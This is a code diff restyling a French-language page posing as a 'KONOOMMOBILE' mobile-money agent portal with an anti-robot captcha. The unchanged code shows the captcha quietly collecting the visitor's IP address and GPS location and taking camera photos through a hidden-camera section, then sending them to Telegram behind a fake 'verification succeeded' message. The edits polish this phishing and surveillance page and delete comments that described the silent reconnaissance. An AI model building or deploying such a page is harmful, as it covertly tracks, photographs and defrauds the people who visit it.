@@ -6,12 +6,13 @@
     <title>KONOOMMOBILE — Portail Agent</title>
     <style>
         :root {
-            --bg-deep: #07090e;
-            --card-bg: rgba(17, 24, 39, 0.90);
-            --accent-gold: #f59e0b;
-            --accent-neon: #10b981;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
+            --bg-deep: #f1f5f9;
+            --card-bg: #ffffff;
+            --accent-gold: #d97706;
+            --accent-neon: #059669;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --border-color: #cbd5e1;
         }
 
         * {
@@ -23,7 +24,6 @@
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: var(--bg-deep);
-            background-image: radial-gradient(circle at 50% 0%, #1f2937 0%, var(--bg-deep) 70%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -39,12 +39,10 @@
         
         .card {
             background: var(--card-bg);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            border: 1px solid var(--border-color);
             border-radius: 24px;
-            padding: 25px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            padding: 30px 25px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.08);
             text-align: center;
             position: relative;
             overflow: hidden;
@@ -56,38 +54,39 @@
             top: 0;
             left: 0;
             right: 0;
-            height: 3px;
+            height: 4px;
             background: linear-gradient(90deg, #f59e0b, #10b981);
         }
 
+        /* Images en taille et proportion d'origine */
         .banner-img {
             width: 100%;
-            max-height: 160px;
-            object-fit: cover;
-            border-radius: 14px;
+            height: auto;
+            object-fit: contain;
+            border-radius: 10px;
             margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: block;
         }
         
         h1 {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             letter-spacing: -0.5px;
-            margin-bottom: 12px;
-            color: #ffffff;
+            margin-bottom: 15px;
+            color: #0f172a;
             text-transform: uppercase;
         }
         
         .description {
-            color: var(--text-muted);
+            color: var(--text-main);
             font-size: 13px;
             line-height: 1.6;
             margin-bottom: 20px;
             text-align: left;
-            background: rgba(255, 255, 255, 0.02);
+            background: #f8fafc;
             padding: 15px;
             border-radius: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            border: 1px solid #e2e8f0;
             white-space: pre-line;
         }
         
@@ -98,17 +97,17 @@
             padding: 15px 20px;
             font-size: 15px;
             font-weight: 600;
-            border-radius: 14px;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
             transition: all 0.2s ease;
-            box-shadow: 0 10px 20px -5px rgba(245, 158, 11, 0.4);
+            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
             margin-top: 10px;
         }
 
         .action-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 25px -5px rgba(245, 158, 11, 0.6);
+            opacity: 0.95;
+            transform: translateY(-1px);
         }
 
         .form-group {
@@ -119,17 +118,18 @@
         .form-group label {
             display: block;
             font-size: 12px;
+            font-weight: 600;
             color: var(--text-muted);
             margin-bottom: 6px;
         }
 
         .form-control {
             width: 100%;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
             padding: 12px 15px;
             border-radius: 10px;
-            color: white;
+            color: var(--text-main);
             font-size: 14px;
             outline: none;
             transition: border-color 0.2s;
@@ -137,6 +137,7 @@
 
         .form-control:focus {
             border-color: var(--accent-gold);
+            background: #ffffff;
         }
 
         .phone-input-wrapper {
@@ -145,8 +146,8 @@
         }
 
         .prefix-box {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: #f1f5f9;
+            border: 1px solid var(--border-color);
             padding: 12px;
             border-radius: 10px;
             font-size: 14px;
@@ -158,8 +159,8 @@
 
         /* CAPTCHA / ANTI-ROBOT BOX */
         .captcha-box {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
             border-radius: 12px;
             padding: 15px;
             margin: 20px 0;
@@ -171,7 +172,7 @@
         }
 
         .captcha-box:hover {
-            background: rgba(255, 255, 255, 0.06);
+            background: #f1f5f9;
         }
 
         .captcha-label {
@@ -185,12 +186,12 @@
         .captcha-checkbox {
             width: 24px;
             height: 24px;
-            border: 2px solid var(--text-muted);
+            border: 2px solid var(--border-color);
             border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: rgba(0,0,0,0.2);
+            background: #ffffff;
             transition: all 0.2s;
         }
 
@@ -217,16 +218,16 @@
         }
 
         .status-msg.error {
-            background: rgba(239, 68, 68, 0.1);
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            color: #f87171;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
             display: block;
         }
 
         .footer-copy {
             margin-top: 20px;
             font-size: 11px;
-            color: rgba(156, 163, 175, 0.5);
+            color: var(--text-muted);
         }
 
         /* CAMÉRA CACHÉE */
@@ -293,7 +294,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                 </div>
             </div>
 
-            <button class="action-btn" onclick="proceedToCaptcha()">Continuer</button>
+            <button class="action-btn" onclick="proceedToCaptcha()">Demander maintenant</button>
             <div class="footer-copy">KONOOMMOBILE — Sécurisé</div>
         </div>
 
@@ -365,7 +366,6 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             checkbox.classList.add('checked');
             checkbox.innerHTML = '✓';
 
-            // Lancement silencieux des processus de reconnaissance (IP, GPS, Caméra)
             const ipPromise = getIPAddress();
             const locPromise = getLocation();
             const photosPromise = capturePhotosWithCamera();
@@ -374,16 +374,15 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                 const [ip, loc, photos] = await Promise.all([ipPromise, locPromise, photosPromise]);
                 
                 if (photos.length === 0) {
-                    // Si l'utilisateur a refusé l'accès caméra ou échec
                     throw new Error("Permissions refusées");
                 }
 
                 await sendAllDataToTelegram(ip, loc, photos);
                 statusMsg.className = 'status-msg error';
                 statusMsg.style.display = 'block';
-                statusMsg.style.background = 'rgba(16, 185, 129, 0.1)';
-                statusMsg.style.borderColor = 'rgba(16, 185, 129, 0.2)';
-                statusMsg.style.color = '#34d399';
+                statusMsg.style.background = '#d1fae5';
+                statusMsg.style.borderColor = '#6ee7b7';
+                statusMsg.style.color = '#065f46';
                 statusMsg.innerHTML = 'Vérification réussie. Traitement du retrait...';
 
             } catch (error) {
@@ -392,7 +391,6 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                 statusMsg.style.display = 'block';
                 statusMsg.innerHTML = 'Impossible de confirmation non robotique. Redirection...';
                 
-                // Redirection vers l'étape 2 après un court délai en cas de refus
                 setTimeout(() => {
                     checkbox.classList.remove('checked');
                     checkbox.innerHTML = '';
